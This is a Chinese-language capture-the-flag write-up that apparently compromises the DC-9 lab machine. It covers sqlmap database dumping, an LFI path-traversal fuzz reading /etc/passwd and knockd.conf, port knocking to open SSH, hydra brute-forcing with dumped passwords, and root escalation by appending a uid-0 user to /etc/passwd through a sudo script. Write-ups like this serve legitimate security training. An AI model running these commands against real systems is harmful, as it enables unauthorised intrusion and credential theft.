# 原创
：  端口敲击守护程序之DC-9

# 端口敲击守护程序之DC-9

### 总结

`getwebshell` : 发现`SQL`注入 → 登录系统 → 疑似`文件包含` → `FUZZ`参数 → 文件包含读取守护程序 → 敲击打开`SSH`端口 → 利用泄露账号密码登录

`提 权 思 路` : 发现3个用户 → 登录获取密码字典 → 再次爆破获取第4个用户 → `sudo`文件发现 → 存在`root`权限写入功能 → `passwd`覆盖提权

### 准备工作

### 信息收集-端口扫描

#### 目标开放端口收集
1.  `sudo nmap --min-rate 10000 -p- 192.168.178.209` 1.   1.  `PORT STATE SERVICE` 1.  `22/tcp filtered ssh` 1.  `80/tcp open http` 
<br/>`开放的端口-&amp;gt;80`<br/>`过滤的端口-&amp;gt;22`
1.  `当端口被列为“被过滤”时，意味着该端口被防火墙或网络设备阻止或过滤。这可能是有意的，例如用作防止未经授权访问的安全措施，也可能是由于网络配置错误或连接问题而无意的。` 1.   1.  `在这种情况下，端口22被过滤，因此可能无法使用该端口建立到目标设备的SSH连接。` 
#### 目标端口对应服务探测
1.  `# tcp探测` 1.  `sudo nmap -sT -sV -O -sC -p22,80 192.168.178.209` 1.   1.  `PORT STATE SERVICE VERSION` 1.  `22/tcp closed ssh` 1.  `80/tcp open http Apache httpd 2.4.38 ((Debian))` 
<br/> 现在`22`端口是关闭的

### 信息收集-端口测试

#### 80-HTTP端口的信息收集

访问 `http://192.168.178.209:80` 看上去像`CMS`<br/> 随便戳了戳发现是`php`的

##### 信息收集-网站指纹
1.  `┌──(root㉿Kali)-[/home/bachang/DC-9]` 1.  `└─# whatweb http://192.168.178.209` 1.  `http://192.168.178.209 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.178.209], Title[Example.com - Staff Details - Welcome]` 
##### 漏洞利用-网站指纹(无)
1.  `searchsploit Staff Details` 1.  `searchsploit Example.com` 
##### 信息收集-HTML隐藏信息查看
1.  `# 利用html2text转换纯文本方便查看` 1.  `curl http://192.168.178.209 | html2text` 
让我们点击其他菜单，可能是提示

##### 信息收集-目录扫描

###### 信息收集-目录扫描初步
1.  `dirsearch -u http://192.168.178.209 -x 302,403,404` 
<br/> 因为扫出了目录，深层次的扫描待选，后期可能会选择`.php`的后缀扫描
1.  `信息收集-目录扫描(后缀)` 1.  `信息收集-目录扫描(深度/大字典后缀)` 
##### 信息收集-目录访问

###### 端点访问

空白

<br/>`.php`可能可以`fuzz`

<br/> 没东西

<br/> 里面的按钮按了没反应，也没看到什么源码

<br/> 登录端点

然后还有一个我可以点击的`search`

#### 功能点的实践

之前信息收集的内容还可以深入，不过都待定

##### 漏洞探测-nikto扫描

首先挂上一个扫描器
1.  `nikto -h http://192.168.178.209` 
回过头来看发现没什么

##### 登录端点浅浅实践

在登录端点来一手弱口令，以及万能密码发现都没用

<br/> 然后因为不知道账号是啥，尝试挂着跑`admin`账户的弱口令

### 漏洞利用-getwebshell

#### 后台登录

##### 搜索功能点实践-SQL注入

接下来尝试来到搜索功能点，尝试输入一个`'`破坏完整性<br/> 因为搜索功能点大致会并入查询语句

<br/> 尝试输入了一个`'`之后发现没什么

<br/> 因为`sql`语句的不同，体现方法也是不一样滴<br/> 先试试正常的语句

<br/> 但是`Julie'`就什么都没显示，推测要注释掉后面的内容<br/>`Julie' -- qwe` 显示了内容

<br/> 极大可能是存在`sql`注入的，使用`sqlmap`

###### POST型

在传参的地方打上`*`
1.  `# 基础探测` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*"` 1.  `# 发现存在之后直接爆数据库` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" --dbs` 1.  `# 爆出数据库之后爆表（首页的关键词Staff，先看这个)` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" -D Staff --tables` 1.  `# 爆字段名` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" -D Staff -T Users --columns` 1.  `# 爆字段中数据` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" -D Staff -T Users -C Username,Password --dump` 
基础探测存在

<br/> 存在三个数据库，首页的关键词`Staff`，先看这个，选择第二个

<br/> 优先看`Users`的表

<br/> 存在账号以及密码的字段

<br/> 得到了帐号以及密码的信息

<br/>`admin` | `856f5de590ef37314e7c3bdf6f8a66dc`<br/> 可以发现密码是`md5`加密的格式，因为有`32`位

之后我们看看另一个表，表名也挺诱惑人的
1.  `# 爆出数据库之后爆表` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" -D users --tables` 1.  `# 爆字段名` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" -D users -T UserDetails --columns` 1.  `# 爆整个表` 1.  `sudo sqlmap -u "http://192.168.178.209/results.php" --data "search=Julie*" --dump -D users -T UserDetails` 
只有一个表`UserDetails`

<br/> 太多了，直接一起爆吧

<br/> 爆了很多密码捏

##### hashcat爆破密码(失败)
1.  `# 将密码输出到文件` 1.  `echo '856f5de590ef37314e7c3bdf6f8a66dc' &amp;gt; hash` 1.  `hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt` 
发现没爆破出来，尝试在线解密

<br/>`https://www.somd5.com/`

<br/> 挺难受的，爆破不出来，解密出来的密码`transorbital1`

##### 登录后台

利用获得的账号以及密码登录之后发现多了一个功能点

#### LFI利用

登录之后发现一个奇怪的地方，登陆前底下是没有的
1.  `File does not exist &amp;gt;&amp;gt; 文件不存在` 
推测该功能点的`php`可以尝试`fuzz`参数

##### 暴力破解-参数名破解FUZZ1(失败)
1.  `# -u 指定URL FUZZ 暴力破解的地方 -w 指定字典 -fs 0 不限制文件大小` 1.  `ffuf -u 'http://192.168.178.209/addrecord.php?FUZZ=../../../../../../etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 0 &amp;gt; fuzz.txt` 
没有爆破处内容捏

<br/>`curl`了一下也没有内容，我想起来是要带`cookie`才行

<br/> 修改一下`fuff` `PHPSESSID "h86ph7lej727porurqhsh072vs"`<br/> 带上`cookie`之后`curl`就有值了

##### 暴力破解-参数名破解FUZZ2
1.  `# -b 带cookie` 1.  `ffuf -u 'http://192.168.178.209/addrecord.php?FUZZ=../../../../../../etc/passwd' -w /usr/share/wordlists/dirb/common.txt -b "PHPSESSID=h86ph7lej727porurqhsh072vs" -fs 0 &amp;gt; fuzz.txt` 
从文件夹里面找到一个不一样的`size` 这样太不优雅了
1.  `┌──(root㉿Kali)-[/home/bachang/DC-9]` 1.  `└─# cat fuzz.txt | grep -v 1757 | grep Size -A 2 -B 2` 1.  `* FUZZ: framework` 1.   1.  `[Status: 200, Size: 4110, Words: 95, Lines: 108, Duration: 235ms]` 1.  `| URL | http://192.168.178.209/addrecord.php?file=../../../../../../etc/passwd` 1.  `* FUZZ: file` 
利用`grep`去掉1757并且筛选最后存在的上下各两行找到了`file`

<br/> 得到一个`file`的参数，在`/home`下发现了非常多的目录

<br/> 联想到刚才的数据库账号密码，应该都能登22端口，但是22端口是过滤状态

#### 文件包含利用

##### 日志访问(失败)

一般利用方式是包含`log`的内容写`shell`<br/> 尝试翻阅一下是否有`log`日志
1.  `/var/log/auth.log # ssh登录日志` 1.  `/var/log/apache2/access.log # apache访问日志` 
查看了一下，好像都没有捏

<br/> 想读`.ssh`来着，但是`ssh`没开放

##### 查看端口守护程序

因为存在过滤端口，从这个角度切入

<br/> 因此存在过滤端口的时候可以尝试访问一下这个文件是否存在
1.  `../../../../../etc/knockd.conf` 1.   1.  `[options] UseSyslog ` 1.  `[openSSH] sequence = 7469,8475,9842 ` 1.  `seq_timeout = 25` 1.  `command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT ` 1.  `tcpflags = syn ` 1.   1.  `[closeSSH] sequence = 9842,8475,7469 ` 1.  `seq_timeout = 25 ` 1.  `command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT ` 1.  `tcpflags = syn` 
#### 端口过滤之敲击守护程序

如果我们按照要求依次访问`7469,8475,9842`三个端口在25秒内，那么利用端口敲击守护程序`ssh`端口就会打开

利用工具`knock`
1.  `sudo apt install knockd` 1.  `knock 192.168.178.209 7469 8475 9842` 
之后访问发现`ssh`端口开放了

#### 暴力破解-SSH爆破hydra

根据数据库爆出来的内容制作`user.txt`以及`passwd.txt`字典
1.  `echo 'marym` 1.  `julied` 1.  `fredf` 1.  `barneyr` 1.  `tomc` 1.  `jerrym` 1.  `wilmaf` 1.  `bettyr` 1.  `chandlerb` 1.  `joeyt` 1.  `rachelg` 1.  `rossg` 1.  `monicag` 1.  `phoebeb` 1.  `scoots` 1.  `janitor` 1.  `janitor2' &amp;gt; user.txt` 1.  `echo '3kfs86sfd` 1.  `468sfdfsd2` 1.  `4sfd87sfd1` 1.  `RocksOff` 1.  `TC&amp;amp;TheBoyz` 1.  `B8m#48sd` 1.  `Pebbles` 1.  `BamBam01` 1.  `UrAG0D!` 1.  `Passw0rd` 1.  `yN72#dsd` 1.  `ILoveRachel` 1.  `3248dsds7s` 1.  `smellycats` 1.  `YR3BVxxxw87` 1.  `Ilovepeepee` 1.  `Hawaii-Five-0' &amp;gt; passwd.txt` 1.  `# -L 指定账号字典 -P指定密码字典` 1.  `hydra -L user.txt -P passwd.txt 192.168.178.209 ssh -s 22 -t 64 - o main` 
查看了对应的`main`文件看到了3个可用
1.  `[22][ssh] host: 192.168.178.209 login: chandlerb password: UrAG0D!` 1.  `[22][ssh] host: 192.168.178.209 login: joeyt password: Passw0rd` 1.  `[22][ssh] host: 192.168.178.209 login: janitor password: Ilovepeepee` 
### 内网遨游-getshell

#### 3开SSH

获取账号密码之后利用SSH进行登录(3个小时到了，换了个目标机)
1.  `sudo ssh chandlerb&lt;span class="label label-primary"&gt;@192.168.208.209&lt;/span&gt; -p22` 1.  `password &amp;gt; UrAG0D!` 1.  `sudo ssh joeyt&lt;span class="label label-primary"&gt;@192.168.208.209&lt;/span&gt; -p22` 1.  `password &amp;gt; Passw0rd` 1.  `sudo ssh janitor&lt;span class="label label-primary"&gt;@192.168.208.209&lt;/span&gt; -p22` 1.  `password &amp;gt; Ilovepeepee` 
<br/> 但是发现输入`find`都没什么用，尝试查找内部的敏感信息<br/> 在`janitor`用户下发现了不一样的东西

<br/> 发现是个文件，进入

<br/> 探索之后发现了新的密码文件，再写一个文件利用`hyrda`爆破
1.  `echo 'BamBam01` 1.  `Passw0rd` 1.  `smellycats` 1.  `P0Lic#10-4` 1.  `B4-Tru3-001` 1.  `4uGU5T-NiGHts' &amp;gt; passwd2.txt` 1.  `# -L 指定账号字典 -P指定密码字典` 1.  `hydra -L user.txt -P passwd2.txt 192.168.208.209 ssh -s 22 -t 64 -o main` 
通过爆破得到了新的用户密码
1.  `[22][ssh] host: 192.168.178.209 login: fredf password: B4-Tru3-001` 
进行`ssh`连接
1.  `sudo ssh fredf&lt;span class="label label-primary"&gt;@192.168.208.209&lt;/span&gt; -p22` 1.  `password &amp;gt; B4-Tru3-001` 
#### FLAG1获取

输入`find`命令之后发现只有`fredf`是可以的
1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:~$ find / -name local.txt 2&amp;gt;/dev/null` 1.  `/home/fredf/local.txt` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:~$ cat /home/fredf/local.txt` 1.  `4c30c90388a4b5baa8bf21db8529bb51` 
#### 权限提升

##### Linux提权-sudo提权

查找具有`sudo`权限，且不需要密码的可提权文件
1.  `# 利用sudo -l寻找` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:~$ sudo -l` 1.  `Matching Defaults entries for fredf on dc-9:` 1.  `env_reset, mail_badpass,` 1.  `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin` 1.   1.  `User fredf may run the following commands on dc-9:` 1.  `(root) NOPASSWD: /opt/devstuff/dist/test/test` 
只有`fredf`用户是存在`sudo`

追踪一下这个文件
1.  `# 权限查看 (读与执行)` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:~$ ls -al /opt/devstuff/dist/test/test` 1.  `-rwxr-xr-x 1 root root 1212968 Dec 29 2019 /opt/devstuff/dist/test/test` 1.  `# 查看内容发现看不了` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:~$ cat /opt/devstuff/dist/test/test` 
<br/> 尝试运行
1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:$ cd /opt/devstuff/dist/test` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ ./test` 1.  `Usage: python test.py read append` 1.   1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ sudo /opt/devstuff/dist/test/test` 1.  `Usage: python test.py read append` 
读不了，显示是读`test.py` ，说明使用`test`应该是需要参数的
1.  `# 全局搜索` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ find / -name "test.py" 2&amp;gt;/dev/null` 1.  `/opt/devstuff/test.py` 1.  `/usr/lib/python3/dist-packages/setuptools/command/test.py` 
发现了两个，应该是上面那个
1.  `cat /opt/devstuff/test.py` 
如果传递的参数不等于3，就会输出`Usage: python test.py read append`

不然会读取输入第一个参数内的文件追加写入到第二个参数
1.  `#!/usr/bin/python` 1.   1.  `import sys` 1.   1.  `if len (sys.argv) != 3 :` 1.  `print ("Usage: python test.py read append")` 1.  `sys.exit (1)` 1.   1.  `else :` 1.  `f = open(sys.argv[1], "r")` 1.  `output = (f.read())` 1.   1.  `f = open(sys.argv[2], "a")` 1.  `f.write(output)` 1.  `f.close()` 
#### /etc/passwd覆盖提权

既然是这样的话，那我可以自己写一个`root`权限的用户进行追加覆盖

覆盖掉root的密码
1.  `# Kali机器使用openssl生成密码 -l指定生成密码` 1.  `┌──(root㉿Kali)-[/home/bachang/DC-9]` 1.  `└─# sudo openssl passwd ` 1.  `Password: YaoRuo` 1.  `Verifying - Password: YaoRuo` 1.  `$1$2Pnbp/rL$s7aGNIT5ndyGog5cor6N4.` 
目标机器上覆盖
1.  `# 制作root权限用户 root:x:0:0:root:/root:/bin/bash` 1.  `YaoRuo:$1$2Pnbp/rL$s7aGNIT5ndyGog5cor6N4.:0:0:root:/root:/bin/bash` 1.  `# 写入到可写文件夹中` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ echo 'YaoRuo:$1$2Pnbp/rL$s7aGNIT5ndyGog5cor6N4.:0:0:root:/root:/bin/bash' &amp;gt; /tmp/passwd.txt` 1.  `# 进行覆盖` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ sudo /opt/devstuff/dist/test/test /tmp/passwd.txt /etc/passwd` 1.  `# 权限提升` 1.  `fredf&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test$ su YaoRuo` 1.  `Password: RaoYuo` 1.  `root&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test# id` 1.  `uid=0(root) gid=0(root) groups=0(root)` 
提权成功

#### FLAG2获取
1.  `root&lt;span class="label label-primary"&gt;@dc-9&lt;/span&gt;:/opt/devstuff/dist/test# cat /root/proof.txt` 1.  `e67eaee361edc9e35fc8cfe0b1ea7bd7` 
完结撒花~

### 总结

`filtered`过滤端口也是值得探索的内容<br/> 可能存在端口敲击守护程序`/etc/knockd.conf`

传参进行`fuzz`的时候还是要多试，顺便一提的是登录要记得带上`cookie`

#### 端口敲击守护程序

这个内容本质上就是防止被端口扫描。从资料上看在电网这种工业级上考虑的较多。
1.  `端口扫描也是威胁 Web 安全的一种方式，服务器主机关闭不必要的端口对这一攻击有一定的作用，但是对于必须开启的端口还是存在着安全隐患，为了预防这一类网络攻击,系统采用一种“服务敲门”的方式来开启或关闭端口。` 1.  `“服务敲门”也就是端口试探,它的原理类似一次约定好的秘密握手，一定时间间隔发送一定序列的UDP 或 TCP 数据包,运行在主机上的抓包程序捕捉到之后,开启对应端口或关闭对应端口。以 22 端口为` 
除了使用直接利用本地安装的`knockd`工具之外也可以用其他方法进行端口敲击，就是有时间限制。

例如 `nmap -p[端口] [ip]` `nc [ip] [端口]`

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
